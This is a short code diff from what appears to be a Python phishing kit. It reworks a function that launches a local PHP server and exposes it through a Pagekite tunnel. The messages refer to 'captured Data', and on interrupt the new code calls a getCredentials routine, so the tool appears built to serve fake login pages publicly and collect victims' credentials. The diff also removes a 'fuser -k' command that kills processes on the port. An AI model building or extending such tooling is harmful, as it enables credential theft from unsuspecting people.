@@ -272,17 +272,16 @@ def runPagekite(port):
 		try:
 			subdomain = input("\n{0}[{2}*{0}] {0}Enter A Custom Subdomain Ex.(yourname):\n{0}Custom Subdomain>>> {2}".format(MAIN0, MAIN4, MAIN2))
 			print("\n{0}[{1}*{0}] {1}Use Temporary Email Services(Don't Harm Anyone).{1}".format(MAIN0, MAIN4))
-			print("\n{0}[{1}*{0}] {1}Sometime Email verification Required by Pagekite(Stay Alert){1}".format(MAIN0, MAIN4))
-			print("\n{0}[{1}*{0}] {1}You can also get various subdomain assigned to your subdomain.{1}".format(MAIN0, MAIN4))
-			print("\n{0}[{1}*{0}] {1}Check Control Panel Of pagekite at https://pagekite.net/ .{1}".format(MAIN0, MAIN4))
-			print("\n{0}[{1}*{0}] {1}We are Ready to Launch Pagekite.Press CTRL+C Whenever Need captured Data.{1}".format(MAIN0, MAIN4))
-			input("\n\n{0}[{1}*{0}] {0}Press Enter To Launch The Pagekite...{1}".format(MAIN0, MAIN4))
-			system("fuser -k %s/tcp > /dev/null 2>&1" % (port))
-			system("cd Server/www/ && php -S localhost:%s > /dev/null 2>&1 &" % (port))
+			print("{0}[{1}*{0}] {1}Sometime Email verification Required by Pagekite(Stay Alert){1}".format(MAIN0, MAIN4))
+			print("{0}[{1}*{0}] {1}You can also get various subdomain assigned to your subdomain.{1}".format(MAIN0, MAIN4))
+			print("{0}[{1}*{0}] {1}Check Control Panel Of pagekite at https://pagekite.net/ .{1}".format(MAIN0, MAIN4))
+			print("{0}[{1}*{0}] {1}We are Ready to Launch Pagekite.Press CTRL+C Whenever Need captured Data.{1}".format(MAIN0, MAIN4))
+			input("\n{0}[{1}*{0}] {0}Press Enter To Launch The Pagekite...{1}".format(MAIN0, MAIN4))
 			system('python2 Server/pagekite.py --clean --signup {0} {1}.pagekite.me'.format(port, subdomain))
-		except:
-			print('[*] Unable To get Tunnel..Going Back')
-			sleep(3)				
+		except KeyboardInterrupt:
+			print('[!] Please Copy the Generated Link For Further Use')
+			getCredentials(port)
+
 			
 def runOpenport(port):
 	system('clear')
